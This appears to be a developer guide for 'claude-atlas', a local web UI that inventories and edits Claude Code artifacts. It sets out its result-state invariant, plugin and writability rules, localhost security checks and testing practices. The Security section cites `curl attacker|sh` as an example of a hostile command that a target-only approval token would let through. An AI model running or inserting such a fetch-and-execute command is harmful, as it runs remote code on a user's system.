# claude-atlas

A local web UI that resolves every Claude Code artifact on the machine and lets you edit
the ones that are safe to edit. Node 20+ / ESM, Vite + React + CSS modules, Vitest.

The spec at `docs/superpowers/specs/2026-09-11-claude-atlas-design.md` is the authority on
behaviour. When code and spec disagree, one of them is a bug — decide which and fix it,
then record the decision in the spec's revision history.

## The one invariant

**A reader never reports a bare zero.** `src/server/result.js` is a five-state discriminated
union — `ok`, `empty`, `absent`, `denied`, `malformed` — and those states must stay
distinguishable all the way to the screen. "There is nothing here" and "I could not look"
are different answers, and collapsing them is the failure this whole app exists to prevent.

Two corollaries, both learned from shipped bugs:

- **An indicator must not promise more than the page shows.** A project marker claiming
  `.claude` while the panel renders empty is the same lie in a different costume. After
  touching any reader, re-run the marker-vs-inventory audit across every discovered project.
- **Anything a reader does not recognise still gets listed.** A project's `.claude/` is
  curated by hand, so an unknown entry is something the user put there deliberately; it
  appears under `other` as "no reader for this yet". The global root is deliberately
  excluded — it holds Claude Code's own caches and daemon state, which is noise.

## Things that look wrong but are correct

**Writability is computed from where a file lives, not who wrote it.** `writability.js`
classifies by path. A plugin you wrote yourself is still read-only if it sits in
`plugins/cache/`, because `claude plugin update` overwrites that directory. Users ask about
this; the answer is the mechanism, not the authorship.

**Plugin artifacts load from the plugin root only** —
`plugins/cache/<marketplace>/<plugin>/<version>/<kind>`. Walking the cache for any directory
named `agents/` also finds skills that keep their own prompt files nested, which over-reports.
The count must agree with what `/context` says Claude Code loaded.

**Vendored copies are excluded.** Plugin repos ship `.cursor/`, `.codex-plugin/`, `.agents/`
and friends. Claude Code never loads those; counting them double-reports one artifact under
two paths. `visibleUnder()` in `readers/shared.js` filters any hidden path segment.

**A GitHub repo is a marketplace.** There is no separate marketplace product. A plugin
installed from a personal repo is as much a plugin as an official one.

**Project discovery never scans the filesystem.** It unions the project registry,
`history.jsonl`, and transcript `cwd`s. Measured: 0.65s for 11 exact results, against 0.23s
for a scan that returned 12 hits of which 4 were real. Do not add a scan.

**Deletion moves to the Trash.** `trash.js` refuses rather than unlinking when it cannot
identify a trash mechanism. Never add an `fs.unlink` fallback.

## Security

`security.js` carries the whole defence in three checks: `Origin`, `Host`, and
`application/json` on writes. A page on any site can send requests to `127.0.0.1` — localhost
is not a boundary against the user's own browser — and those three refuse them.

**Do not reintroduce a secret in the URL.** Revisions 2–4 had one (a token, then a single-use
nonce exchanged for a cookie). It defended only against non-browser local clients, which can
read and write `~/.claude` directly and never needed the API, while making the launch link
one-shot — whoever opened it first claimed the server. It was removed deliberately.

Writes that install an executable command require an HMAC confirmation token bound to
**both** the target and the content. Binding to the target alone allows approving `echo hi`
and installing `curl attacker|sh`. `execgate.js` diffs the **union** of keys before and
after: an after-only diff hides deletions, and a string-only shape check misses booleans
that disable guards.

## Working on this

**Tests must fail against reverted code.** The repeated failure mode here was a correct fix
guarded by a vacuous test — a fixture that did not discriminate, or an assertion that passed
either way. Before claiming a fix is guarded, revert the production change and watch the test
go red.

**Render it in a browser.** Several defects reached "all tests pass" and were caught only by
looking: a plugin row that hung on `EISDIR`, a theme transition that left the page painted in
the previous palette, a project panel drawn below the fold so clicking appeared to do nothing.

**Measure instead of asserting.** Claims about this codebase that turned out false include
"session files carry a tail summary" (1 in 20 do) and "therefore we need an index" (a full
113 MB parse takes 0.75s).

**Build before serving.** `bin/claude-atlas.js` serves `dist/`. Source edits are invisible
until `npm run build`.

## Not built yet

Agent and command *creation* (only skills can be created), token costs, a sessions view,
managed-policy source display, and cloud artifacts.

Partly done: the declared-vs-used join. A hook or statusline script that is declared but
missing or unreadable is now surfaced as broken at both scopes. Still unjoined: agent and
command declarations naming an uninstalled plugin, and settings keys silently shadowed by
a stricter managed-scope value.
